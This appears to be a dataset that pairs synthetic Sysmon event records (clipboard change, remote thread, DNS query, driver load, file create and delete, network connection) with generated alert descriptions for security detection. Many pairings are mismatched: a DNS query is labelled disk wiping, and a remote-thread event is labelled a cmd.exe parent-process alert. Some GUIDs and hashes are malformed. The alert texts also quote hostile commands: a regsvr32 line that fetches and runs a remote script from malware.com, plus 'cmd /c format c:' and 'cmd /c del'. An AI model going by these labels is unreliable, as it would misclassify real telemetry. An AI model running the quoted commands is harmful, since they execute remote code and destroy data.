{"{\"Event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"System\": {\"Provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"}, \"EventID\": \"24\", \"EventName\": \"ClipboardChange (New content in the clipboard)\", \"EventDescription\": \"This event is generated when the system clipboard contents change.\", \"Version\": \"5\", \"Level\": \"4\", \"Task\": \"24\", \"Opcode\": \"0\", \"Keywords\": \"0x8000000000000000\", \"TimeCreated\": {\"@SystemTime\": \"2023-04-16T14:31:42.0820175Z\"}, \"EventRecordID\": \"6279\", \"Correlation\": null, \"Execution\": {\"@ProcessID\": \"704\", \"@ThreadID\": \"1276\"}, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Computer\": \"COMPUTERNAME\", \"Security\": {\"@UserID\": \"S-1-5-18\"}}, \"EventData\": {\"Data\": [{\"@Name\": \"UtcTime\", \"#text\": \"2023-04-16 14:31:42.081\"}, {\"@Name\": \"ProcessGuid\", \"#text\": \"{7bc00c1d-a657-626f-6f01-000000000300}\"}, {\"@Name\": \"ProcessId\", \"#text\": \"7696\"}, {\"@Name\": \"Image\", \"#text\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"}, {\"@Name\": \"User\", \"#text\": \"COMPUTERNAME\\\\User\"}, {\"@Name\": \"ClipboardContent\", \"#text\": \"This is a test clipboard content\"}]}}}\n": "Alert Name: ClipboardChange (New content in the clipboard). - Key Characteristics: ClipboardChange, system clipboard contents change. - Cybersecurity Alert Description: This alert is generated by Microsoft Windows Sysmon when there is a change in the system clipboard contents. The alert provides information about the process ID, image, and user associated with the change. This can be useful for detecting suspicious activity related to data exfiltration or other malicious activities involving the clipboard."}
{"{\"Event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"System\": {\"Provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"}, \"EventID\": \"8\", \"EventName\": \"CreateRemoteThread\", \"EventDescription\": \"The CreateRemoteThread event detects when a process creates a thread in another process. This technique is used by malware to inject code and hide in other processes. The event indicates the source and target process. It gives information on the code that will be run in the new thread: StartAddress, StartModule and StartFunction.\", \"Version\": \"5\", \"Level\": \"4\", \"Task\": \"8\", \"Opcode\": \"0\", \"Keywords\": \"0x8000000000000000\", \"TimeCreated\": {\"@SystemTime\": \"2023-04-16T10:20:30.123456Z\"}, \"EventRecordID\": \"123456\", \"Correlation\": null, \"Execution\": {\"@ProcessID\": \"4\", \"@ThreadID\": \"80\"}, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Computer\": \"DESKTOP-EXAMPLE\", \"Security\": {\"@UserID\": \"S-1-5-18\"}}, \"EventData\": {\"Data\": [{\"@Name\": \"RuleName\", \"#text\": \"-\"}, {\"@Name\": \"UtcTime\", \"#text\": \"2023-04-16 10:20:30.123\"}, {\"@Name\": \"SourceProcessGUID\", \"#text\": \"{A1B2C3D4-E5F6-47A8-89AB-1C2D3E4F5G6H}\"}, {\"@Name\": \"SourceProcessId\", \"#text\": \"1234\"}, {\"@Name\": \"SourceImage\", \"#text\": \"C:\\\\Windows\\\\System32\\\\example.exe\"}, {\"@Name\": \"TargetProcessGUID\", \"#text\": \"{F1E2D3C4-B5A6-49C8-D9E1-0F2A3B4C5D6E}\"}, {\"@Name\": \"TargetProcessId\", \"#text\": \"5678\"}, {\"@Name\": \"TargetImage\", \"#text\": \"C:\\\\Windows\\\\System32\\\\example-target.exe\"}, {\"@Name\": \"NewThreadId\", \"#text\": \"999\"}, {\"@Name\": \"StartAddress\", \"#text\": \"0x1234567890ABCDEF\"}, {\"@Name\": \"StartModule\", \"#text\": \"C:\\\\Windows\\\\System32\\\\example-target.dll\"}, {\"@Name\": \"StartFunction\", \"#text\": \"example_function\"}]}}}\n": "Alert Name: Unusual Parent Process. High. Command and Scripting Interpreter (T1059.003). - Key Characteristics: Suspicious parent-child process relationship with cmd.exe descending from an unusual process. - Cybersecurity Alert Description: The alert indicates the detection of a suspicious parent-child process relationship with cmd.exe descending from an unusual process. The alert is classified as high severity and falls under the Command and Scripting Interpreter (T1059.003) category. Alert Name: Command Interpreter Launched by Unusual Parent Process. - Key Characteristics: Custom command interpreter, malicious activity indicator, T1059.003. - Cybersecurity Alert Description: The system command interpreter (cmd.exe) was launched by a non-standard parent process, which could indicate the use of a custom command interpreter and potentially malicious activity. This alert falls under the T1059.003 category of Command and Scripting Interpreter and can be detected through EDR."}
{"{\"Event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"System\": {\"Provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"}, \"EventID\": \"22\", \"EventName\": \"DNSEvent (DNS query)\", \"EventDescription\": \"This event is generated when a process executes a DNS query, whether the result is successful or fails, cached or not. The telemetry for this event was added for Windows 8.1 so it is not available on Windows 7 and earlier.\", \"Version\": \"5\", \"Level\": \"4\", \"Task\": \"22\", \"Opcode\": \"0\", \"Keywords\": \"0x8000000000000000\", \"TimeCreated\": {\"@SystemTime\": \"2023-04-16T15:30:00.000000Z\"}, \"EventRecordID\": \"123456\", \"Correlation\": null, \"Execution\": {\"@ProcessID\": \"1234\", \"@ThreadID\": \"5678\"}, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Computer\": \"mycomputer\", \"Security\": null}, \"EventData\": {\"Data\": [{\"@Name\": \"RuleName\", \"#text\": \"-\"}, {\"@Name\": \"UtcTime\", \"#text\": \"2023-04-16 15:30:00.000\"}, {\"@Name\": \"ProcessGuid\", \"#text\": \"{12345678-1234-1234-1234-123456789012}\"}, {\"@Name\": \"ProcessId\", \"#text\": \"5678\"}, {\"@Name\": \"QueryName\", \"#text\": \"example.com\"}, {\"@Name\": \"QueryStatus\", \"#text\": \"0\"}, {\"@Name\": \"QueryResults\", \"#text\": \"1.2.3.4\"}]}}}\n": "Alert Name: Potential Disk Wiping Activity Detected. - Key Characteristics: High, Disk Wipe, Behavior, EDR. - Cybersecurity Alert Description: This alert indicates potential disk wiping activity detected on a system or network, which can lead to the interruption of availability to system and network resources. The alert provides an example of the behavior observed on a Windows device with the timestamp and relevant processes involved. It is important to investigate and take necessary actions to prevent such activities. Alert Name: Disk Wiping Detection. - Key Characteristics: Potential disk wiping activity detected on Windows device through cmd.exe and explorer.exe. - Cybersecurity Alert Description: This alert indicates potential disk wiping activity on a Windows device initiated through cmd.exe with the command \"cmd /c format c:\" and also through explorer.exe. This alert should be investigated immediately to prevent data loss or destruction."}
{"{\"Event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"System\": {\"Provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"}, \"EventID\": \"6\", \"EventName\": \"Driver loaded\", \"EventDescription\": \"The driver loaded events provides information about a driver being loaded on the system. The configured hashes are provided as well as signature information. The signature is created asynchronously for performance reasons and indicates if the file was removed after loading.\", \"Version\": \"5\", \"Level\": \"4\", \"Task\": \"6\", \"Opcode\": \"0\", \"Keywords\": \"0x8000000000000000\", \"TimeCreated\": {\"@SystemTime\": \"2023-04-16T12:34:56.7890123Z\"}, \"EventRecordID\": \"123456\", \"Correlation\": null, \"Execution\": {\"@ProcessID\": \"2068\", \"@ThreadID\": \"2080\"}, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Computer\": \"DESKTOP-EXAMPLE\", \"Security\": {\"@UserID\": \"S-1-5-18\"}}, \"EventData\": {\"Data\": [{\"@Name\": \"ImageLoaded\", \"#text\": \"C:\\\\Windows\\\\System32\\\\drivers\\\\ExampleDriver.sys\"}, {\"@Name\": \"Hashes\", \"#text\": \"SHA1=1234567890ABCDEF1234567890ABCDEF12345678,MD5=ABCDE12345ABCDE12345ABCDE12345AB,SHA256=1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF,IMPHASH=54321ABCDE54321ABCDE54321ABCDE54\"}, {\"@Name\": \"Signed\", \"#text\": \"true\"}, {\"@Name\": \"Signature\", \"#text\": \"Example Company Inc.\"}, {\"@Name\": \"SignatureStatus\", \"#text\": \"Valid\"}]}}}\n": "Alert Name: Modify System Image. - Key Characteristics: Adversaries may modify the operating system of embedded network devices to weaken defenses and gain new capabilities. Defense Evasion. Critical. Endpoint. - Cybersecurity Alert Description: The alert warns of potential unauthorized modifications to critical system files on the endpoint server, which can weaken defenses and provide adversaries with new capabilities. Monitoring for any unauthorized modifications to system images is critical to prevent potential security breaches. Alert Name: File Write Attempt to Modify System Disk Image or Firmware. - Key Characteristics: Detect, Critical, Unauthorized Modification, System File. - Cybersecurity Alert Description: The alert indicates an attempt to modify the system's disk image or firmware, which is unauthorized and poses a critical threat to the system's security. Detection of this activity is crucial to prevent any further damage."}
{"{\"Event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"System\": {\"Provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"}, \"EventID\": \"27\", \"EventName\": \"FileBlockExecutable\", \"EventDescription\": \"This event is generated when Sysmon detects and blocks the creation of executable files.\", \"Version\": \"5\", \"Level\": \"4\", \"Task\": \"27\", \"Opcode\": \"0\", \"Keywords\": \"0x8000000000000000\", \"TimeCreated\": {\"@SystemTime\": \"2023-04-16T10:30:00.000000Z\"}, \"EventRecordID\": \"123456\", \"Correlation\": null, \"Execution\": {\"@ProcessID\": \"1234\", \"@ThreadID\": \"5678\"}, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Computer\": \"COMPUTERNAME\", \"Security\": {\"@UserID\": \"S-1-5-18\"}}, \"EventData\": {\"Data\": [{\"@Name\": \"RuleName\", \"#text\": \"Block Executables\"}, {\"@Name\": \"UtcTime\", \"#text\": \"2023-04-16 10:30:00.000\"}, {\"@Name\": \"ProcessGuid\", \"#text\": \"{00000000-0000-0000-0000-000000000000}\"}, {\"@Name\": \"ProcessId\", \"#text\": \"1111\"}, {\"@Name\": \"Image\", \"#text\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"}, {\"@Name\": \"FileVersion\", \"#text\": \"10.0.19041.746 (WinBuild.160101.0800)\"}, {\"@Name\": \"Description\", \"#text\": \"Windows Command Processor\"}, {\"@Name\": \"Hashes\", \"#text\": \"SHA1=ABCDE12345\"}]}}}\n": "Alert Name: Indirect Command Execution. - Key Characteristics: Adversaries exploit utilities to bypass security restrictions. Endpoint server01 affected. Command executed: regsvr32.exe /s /u /i:http://malware.com/malware.sct scrobj.dll. Unauthorized command execution blocked. - Cybersecurity Alert Description: This alert reports an incident of Indirect Command Execution where adversaries abused utilities to execute a command and bypass security restrictions. The endpoint server01 was affected, and the command executed was regsvr32.exe /s /u /i:http://malware.com/malware.sct scrobj.dll using regsvr32.exe. The alert indicates that unauthorized command execution was blocked."}
{"{\"Event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"System\": {\"Provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"}, \"EventID\": \"28\", \"EventName\": \"FileBlockShredding\", \"EventDescription\": \"This event is generated when Sysmon detects and blocks file shredding from tools such as SDelete.\", \"Version\": \"5\", \"Level\": \"4\", \"Task\": \"28\", \"Opcode\": \"0\", \"Keywords\": \"0x8000000000000000\", \"TimeCreated\": {\"@SystemTime\": \"2023-04-16T12:00:00.000Z\"}, \"EventRecordID\": \"12345\", \"Correlation\": null, \"Execution\": {\"@ProcessID\": \"1234\", \"@ThreadID\": \"5678\"}, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Computer\": \"ComputerName\", \"Security\": {\"@UserID\": \"S-1-5-18\"}}, \"EventData\": {\"Data\": [{\"@Name\": \"RuleName\", \"#text\": \"FileBlockShredding\"}, {\"@Name\": \"UtcTime\", \"#text\": \"2023-04-16 12:00:00.000\"}, {\"@Name\": \"ProcessGuid\", \"#text\": \"{11223344-5566-7788-99AA-BBCCDDEEFF00}\"}, {\"@Name\": \"ProcessId\", \"#text\": \"7890\"}, {\"@Name\": \"Image\", \"#text\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"}, {\"@Name\": \"TargetFilename\", \"#text\": \"C:\\\\Users\\\\JohnDoe\\\\Documents\\\\file.txt\"}, {\"@Name\": \"BytesWritten\", \"#text\": \"1024\"}, {\"@Name\": \"Offset\", \"#text\": \"0\"}, {\"@Name\": \"ThreadId\", \"#text\": \"6789\"}, {\"@Name\": \"Hashes\", \"#text\": \"SHA256=F2C918E678A421A81E834A5D48B267A1B9C4E4C4F4D483BFA0CF238E69AB2D98\"}]}}}\n": "Alert Name: Potential Disk Wiping Activity Detected. - Key Characteristics: High, Disk Wipe, Behavior, EDR. - Cybersecurity Alert Description: This alert indicates potential disk wiping activity detected on a system or network, which can lead to the interruption of availability to system and network resources. The alert provides an example of the behavior observed on a Windows device with the timestamp and relevant processes involved. It is important to investigate and take necessary actions to prevent such activities. Alert Name: Disk Wiping Detection. - Key Characteristics: Potential disk wiping activity detected on Windows device through cmd.exe and explorer.exe. - Cybersecurity Alert Description: This alert indicates potential disk wiping activity on a Windows device initiated through cmd.exe with the command \"cmd /c format c:\" and also through explorer.exe. This alert should be investigated immediately to prevent data loss or destruction."}
{"{\"Event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"System\": {\"Provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"}, \"EventID\": \"15\", \"EventName\": \"FileCreateStreamHash\", \"EventDescription\": \"This event logs when a named file stream is created, and it generates events that log the hash of the contents of the file to which the stream is assigned (the unnamed stream), as well as the contents of the named stream. There are malware variants that drop their executables or configuration settings via browser downloads, and this event is aimed at capturing that based on the browser attaching a Zone.Identifier \\\"mark of the web\\\" stream.\", \"Version\": \"5\", \"Level\": \"4\", \"Task\": \"15\", \"Opcode\": \"0\", \"Keywords\": \"0x8000000000000010\", \"TimeCreated\": {\"@SystemTime\": \"2023-04-15T14:23:45.2947437Z\"}, \"EventRecordID\": \"123456\", \"Correlation\": null, \"Execution\": {\"@ProcessID\": \"1234\", \"@ThreadID\": \"5678\"}, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Computer\": \"COMPUTERNAME\", \"Security\": {\"@UserID\": \"S-1-5-18\"}}, \"EventData\": {\"Data\": [{\"@Name\": \"UtcTime\", \"#text\": \"2023-04-15 14:23:45.294\"}, {\"@Name\": \"ProcessGuid\", \"#text\": \"{01234567-89ab-cdef-0123-456789abcdef}\"}, {\"@Name\": \"ProcessId\", \"#text\": \"4321\"}, {\"@Name\": \"Image\", \"#text\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"}, {\"@Name\": \"TargetFilename\", \"#text\": \"C:\\\\Users\\\\username\\\\Documents\\\\example.txt\"}, {\"@Name\": \"CreationUtcTime\", \"#text\": \"2023-04-15 14:23:45.294\"}, {\"@Name\": \"HashType\", \"#text\": \"SHA256\"}, {\"@Name\": \"Hash\", \"#text\": \"0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\"}]}}}\n": "Alert Name: Modify System Image. - Key Characteristics: Adversaries may modify the operating system of embedded network devices to weaken defenses and gain new capabilities. Defense Evasion. Critical. Endpoint. - Cybersecurity Alert Description: The alert warns of potential unauthorized modifications to critical system files on the endpoint server, which can weaken defenses and provide adversaries with new capabilities. Monitoring for any unauthorized modifications to system images is critical to prevent potential security breaches. Alert Name: File Write Attempt to Modify System Disk Image or Firmware. - Key Characteristics: Detect, Critical, Unauthorized Modification, System File. - Cybersecurity Alert Description: The alert indicates an attempt to modify the system's disk image or firmware, which is unauthorized and poses a critical threat to the system's security. Detection of this activity is crucial to prevent any further damage."}
{"{\"Event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"System\": {\"Provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"}, \"EventID\": \"11\", \"EventName\": \"FileCreate\", \"EventDescription\": \"File create operations are logged when a file is created or overwritten. This event is useful for monitoring autostart locations, like the Startup folder, as well as temporary and download directories, which are common places malware drops during initial infection.\", \"Version\": \"5\", \"Level\": \"4\", \"Task\": \"11\", \"Opcode\": \"0\", \"Keywords\": \"0x8000000000000000\", \"TimeCreated\": {\"@SystemTime\": \"2023-04-16T12:34:56.7890123Z\"}, \"EventRecordID\": \"123456\", \"Correlation\": null, \"Execution\": {\"@ProcessID\": \"1234\", \"@ThreadID\": \"5678\"}, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Computer\": \"user-pc.example.com\", \"Security\": {\"@UserID\": \"S-1-5-21-1234567890-1234567890-1234567890-1001\"}}, \"EventData\": {\"Data\": [{\"@Name\": \"RuleName\"}, {\"@Name\": \"UtcTime\", \"#text\": \"2023-04-16 12:34:56.7890123\"}, {\"@Name\": \"ProcessGuid\", \"#text\": \"{89F7E2B3-1234-5678-9ABC-123456ABCDEF}\"}, {\"@Name\": \"ProcessId\", \"#text\": \"4242\"}, {\"@Name\": \"Image\", \"#text\": \"C:\\\\Windows\\\\System32\\\\example.exe\"}, {\"@Name\": \"TargetFilename\", \"#text\": \"C:\\\\Users\\\\user\\\\Documents\\\\NewFile.txt\"}, {\"@Name\": \"CreationUtcTime\", \"#text\": \"2023-04-16 12:34:56.7890123\"}, {\"@Name\": \"Hash\", \"#text\": \"SHA1=ABCDEFGHIJK1234567890,MD5=1234567890ABCDEF,SHA256=1234567890ABCDEFGHIJKLMNOPQRSTUVWX\"}]}}}\n": "Alert Name: Modify System Image. - Key Characteristics: Adversaries may modify the operating system of embedded network devices to weaken defenses and gain new capabilities. Defense Evasion. Critical. Endpoint. - Cybersecurity Alert Description: The alert warns of potential unauthorized modifications to critical system files on the endpoint server, which can weaken defenses and provide adversaries with new capabilities. Monitoring for any unauthorized modifications to system images is critical to prevent potential security breaches. Alert Name: File Write Attempt to Modify System Disk Image or Firmware. - Key Characteristics: Detect, Critical, Unauthorized Modification, System File. - Cybersecurity Alert Description: The alert indicates an attempt to modify the system's disk image or firmware, which is unauthorized and poses a critical threat to the system's security. Detection of this activity is crucial to prevent any further damage."}
{"{\"Event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"System\": {\"Provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"}, \"EventID\": \"23\", \"EventName\": \"FileDelete (File Delete archived)\", \"EventDescription\": \"A file was deleted. Additionally to logging the event, the deleted file is also saved in the ArchiveDirectory (which is C:\\\\Sysmon by default). Under normal operating conditions this directory might grow to an unreasonable size - see event ID 26: FileDeleteDetected for similar behavior but without saving the deleted files.\", \"Version\": \"5\", \"Level\": \"4\", \"Task\": \"23\", \"Opcode\": \"0\", \"Keywords\": \"0x8000000000000000\", \"TimeCreated\": {\"@SystemTime\": \"2023-04-16T08:30:00.000000Z\"}, \"EventRecordID\": \"1234\", \"Correlation\": null, \"Execution\": {\"@ProcessID\": \"1234\", \"@ThreadID\": \"5678\"}, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Computer\": \"MyComputerName\", \"Security\": {\"@UserID\": \"S-1-5-18\"}}, \"EventData\": {\"Data\": [{\"@Name\": \"RuleName\", \"#text\": \"FileDelete\"}, {\"@Name\": \"UtcTime\", \"#text\": \"2023-04-16 08:30:00.000\"}, {\"@Name\": \"ProcessGuid\", \"#text\": \"{2fd8b1d1-7d53-619c-0000-00106fd8e400}\"}, {\"@Name\": \"ProcessId\", \"#text\": \"1234\"}, {\"@Name\": \"Image\", \"#text\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"}, {\"@Name\": \"TargetFilename\", \"#text\": \"C:\\\\Users\\\\username\\\\Documents\\\\example.txt\"}, {\"@Name\": \"Hash\", \"#text\": \"EFD2BDE64D514DD337E19F8F8D27A1C5\"}, {\"@Name\": \"Signed\", \"#text\": \"false\"}]}}}\n": "Alert Name: Indicator Removal. - Key Characteristics: Defense Evasion, Endpoint, File Deletion. - Cybersecurity Alert Description: Adversaries may delete or modify artifacts within systems to remove evidence of their presence or hinder defenses. This high severity threat uses defense evasion techniques and affects the endpoint desktop01. Unauthorized file deletion of malware.exe located in C:\\ProgramData is blocked. Alert Name: File Deletion Attempt to Avoid Detection. - Key Characteristics: High Severity, Indicators of Compromise Removal, Unauthorized File Deletion. - Cybersecurity Alert Description: This high severity alert warns of an attempt to remove indicators of compromise to avoid detection. An unauthorized file deletion was detected, indicating a potential compromise that requires further investigation and appropriate action."}
{"{\"event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"system\": {\"provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"}, \"EventID\": \"26\", \"EventName\": \"FileDeleteDetected (File Delete logged)\", \"EventDescription\": \"A file was deleted.\", \"version\": \"5\", \"level\": \"4\", \"task\": \"26\", \"opcode\": \"0\", \"keywords\": \"0x8000000000000000\", \"timeCreated\": {\"@SystemTime\": \"2023-04-16T14:30:01.9068554Z\"}, \"eventRecordID\": \"123456\", \"correlation\": null, \"execution\": {\"@ProcessID\": \"1234\", \"@ThreadID\": \"5678\"}, \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"computername.domain\", \"security\": {\"@UserID\": \"S-1-5-18\"}}, \"EventData\": {\"Data\": [{\"@Name\": \"UtcTime\", \"#text\": \"2023-04-16 14:30:01.906\"}, {\"@Name\": \"ProcessGuid\", \"#text\": \"{00000000-0000-0000-0000-000000000000}\"}, {\"@Name\": \"ProcessId\", \"#text\": \"1234\"}, {\"@Name\": \"Image\", \"#text\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"}, {\"@Name\": \"TargetFilename\", \"#text\": \"C:\\\\test\\\\file.txt\"}, {\"@Name\": \"Hash\", \"#text\": \"00000000000000000000000000000000\"}]}}}\n": "Alert Name: Data Destruction Threat. - Key Characteristics: Endpoint activity detected, new behavior, high impact, cmd /c del command used. - Cybersecurity Alert Description: This alert indicates that data destruction activity was detected on an endpoint using the \"cmd /c del\" command. The behavior is new and has a high impact, making it important to investigate the source and extent of the activity."}
{"{\"Event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"System\": {\"Provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"}, \"EventID\": \"7\", \"EventName\": \"Image loaded\", \"EventDescription\": \"The image loaded event logs when a module is loaded in a specific process. This event is disabled by default and needs to be configured with the \\\"\\u00e2\\u20ac\\u201cl\\\" option. It indicates the process in which the module is loaded, hashes and signature information. The signature is created asynchronously for performance reasons and indicates if the file was removed after loading. This event should be configured carefully, as monitoring all image load events will generate a significant amount of logging.\", \"Version\": \"5\", \"Level\": \"4\", \"Task\": \"7\", \"Opcode\": \"0\", \"Keywords\": \"0x8000000000000000\", \"TimeCreated\": {\"@SystemTime\": \"2023-04-16T13:24:53.1234567Z\"}, \"EventRecordID\": \"123456\", \"Correlation\": null, \"Execution\": {\"@ProcessID\": \"4\", \"@ThreadID\": \"56\"}, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Computer\": \"DESKTOP-EXAMPLE\", \"Security\": {\"@UserID\": \"S-1-5-18\"}}, \"EventData\": {\"Data\": [{\"@Name\": \"UtcTime\", \"#text\": \"2023-04-16 13:24:53.1234567\"}, {\"@Name\": \"ProcessGuid\", \"#text\": \"{12345678-1234-1234-1234-1234567890AB}\"}, {\"@Name\": \"ProcessId\", \"#text\": \"1234\"}, {\"@Name\": \"Image\", \"#text\": \"C:\\\\Windows\\\\System32\\\\example.exe\"}, {\"@Name\": \"ImageLoaded\", \"#text\": \"C:\\\\Windows\\\\System32\\\\example_dll.dll\"}, {\"@Name\": \"FileVersion\", \"#text\": \"1.0.0.1\"}, {\"@Name\": \"Description\", \"#text\": \"Example DLL\"}, {\"@Name\": \"Product\", \"#text\": \"Example Product\"}, {\"@Name\": \"Company\", \"#text\": \"Example Company\"}, {\"@Name\": \"OriginalFileName\", \"#text\": \"example_dll.dll\"}, {\"@Name\": \"CommandLine\", \"#text\": \"\\\"C:\\\\Windows\\\\System32\\\\example.exe\\\" /exampleParameter\"}, {\"@Name\": \"CurrentDirectory\", \"#text\": \"C:\\\\Windows\\\\System32\\\\\"}, {\"@Name\": \"User\", \"#text\": \"DESKTOP-EXAMPLE\\\\Administrator\"}, {\"@Name\": \"LogonGuid\", \"#text\": \"{12345678-1234-1234-1234-1234567890AC}\"}, {\"@Name\": \"LogonId\", \"#text\": \"0x123456\"}, {\"@Name\": \"TerminalSessionId\", \"#text\": \"1\"}, {\"@Name\": \"IntegrityLevel\", \"#text\": \"High\"}, {\"@Name\": \"Hashes\", \"#text\": \"SHA1=1A2B3C4D5E6F7G8H9I0JKLMNOPQRSTU;MD5=ABCDEFGHIJKLMNOP;SHA256=1234567890ABCDEFGHIJKLMNOPQRSTUVWX;IMPHASH=1234567890ABCDEFGHIJKLMNOPQRSTUVWX\"}, {\"@Name\": \"Signed\", \"#text\": \"true\"}, {\"@Name\": \"Signature\", \"#text\": \"Example Company\"}, {\"@Name\": \"SignatureStatus\", \"#text\": \"Valid\"}]}}}\n": "Alert Name: Implant Internal Image. - Key Characteristics: High, detected on PC-1234, internal_image.dll, explorer.exe. - Cybersecurity Alert Description: A high-level alert has been triggered due to the detection of an implant internal image on a device. The file associated with the alert is internal_image.dll and it is involved with the process explorer.exe. It is recommended to investigate and take necessary actions to mitigate the threat. Alert Name: Implanted Container Image. - Key Characteristics: Internal container image detected on host SERVER-789. - Cybersecurity Alert Description: This alert indicates that an implanted internal container image has been detected on a host. This could potentially be a sign of a malicious actor attempting to gain unauthorized access to the system."}
{"{\"Event\": {\"@xmlns\": \"http://schemas.microsoft.com/win/2004/08/events/event\", \"System\": {\"Provider\": {\"@Name\": \"Microsoft-Windows-Sysmon\", \"@Guid\": \"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"}, \"EventID\": \"3\", \"EventName\": \"Network connection\", \"EventDescription\": \"The network connection event logs TCP/UDP connections on the machine. It is disabled by default. Each connection is linked to a process through the ProcessId and ProcessGuid fields. The event also contains the source and destination host names IP addresses, port numbers and IPv6 status.\", \"Version\": \"5\", \"Level\": \"4\", \"Task\": \"3\", \"Opcode\": \"0\", \"Keywords\": \"0x8000000000000000\", \"TimeCreated\": {\"@SystemTime\": \"2023-04-16T12:34:56.789Z\"}, \"EventRecordID\": \"123456\", \"Correlation\": null, \"Execution\": {\"@ProcessID\": \"2080\", \"@ThreadID\": \"2076\"}, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Computer\": \"DESKTOP-EXAMPLE\", \"Security\": {\"@UserID\": \"S-1-5-18\"}}, \"EventData\": {\"Data\": [{\"@Name\": \"RuleName\", \"#text\": \"-\"}, {\"@Name\": \"UtcTime\", \"#text\": \"2023-04-16 12:34:56.789\"}, {\"@Name\": \"ProcessGuid\", \"#text\": \"{4d4a5a42-4db8-5eaf-0000-0010d7a71100}\"}, {\"@Name\": \"ProcessId\", \"#text\": \"1234\"}, {\"@Name\": \"Image\", \"#text\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\"}, {\"@Name\": \"User\", \"#text\": \"NT AUTHORITY\\\\SYSTEM\"}, {\"@Name\": \"Protocol\", \"#text\": \"6\"}, {\"@Name\": \"Initiated\", \"#text\": \"true\"}, {\"@Name\": \"SourceIsIpv6\", \"#text\": \"false\"}, {\"@Name\": \"SourceIp\", \"#text\": \"192.168.1.10\"}, {\"@Name\": \"SourceHostname\", \"#text\": \"DESKTOP-EXAMPLE\"}, {\"@Name\": \"SourcePort\", \"#text\": \"12345\"}, {\"@Name\": \"SourcePortName\", \"#text\": \"-\"}, {\"@Name\": \"DestinationIsIpv6\", \"#text\": \"false\"}, {\"@Name\": \"DestinationIp\", \"#text\": \"93.184.216.34\"}, {\"@Name\": \"DestinationHostname\", \"#text\": \"example.com\"}, {\"@Name\": \"DestinationPort\", \"#text\": \"80\"}, {\"@Name\": \"DestinationPortName\", \"#text\": \"HTTP\"}]}}}\n": "Alert Name: Suspicious Web Service Connection. - Key Characteristics: Suspicious network activity, web service, endpoint, svchost.exe, DcomLaunch, W3SVC, inetsrv, w3wp.exe. - Cybersecurity Alert Description: Suspicious network activity related to a web service on the endpoint has been detected. The process involved is svchost.exe with the argument -k DcomLaunch and the use of W3SVC and inetsrv\\w3wp.exe. Further investigation is recommended to determine if this is a potential threat."}
